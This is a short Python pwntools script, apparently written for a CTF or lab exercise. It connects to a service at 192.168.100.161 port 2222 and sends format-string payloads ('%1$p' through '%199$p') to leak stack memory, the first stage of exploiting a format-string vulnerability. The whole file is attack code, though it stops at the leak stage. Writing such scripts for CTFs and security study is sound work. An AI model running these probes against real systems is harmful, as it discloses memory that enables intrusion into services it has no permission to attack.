from pwn import *
from pwn import p64
context.log_level = 'debug'
conn = remote('192.168.100.161', 2222)
conn.recvuntil(b'> ')

for n in range(1,200):
    payload = b'%' + str(n).encode() +b'$p'
    conn.send(payload)
    conn.recvuntil(b'> ')

conn.close()
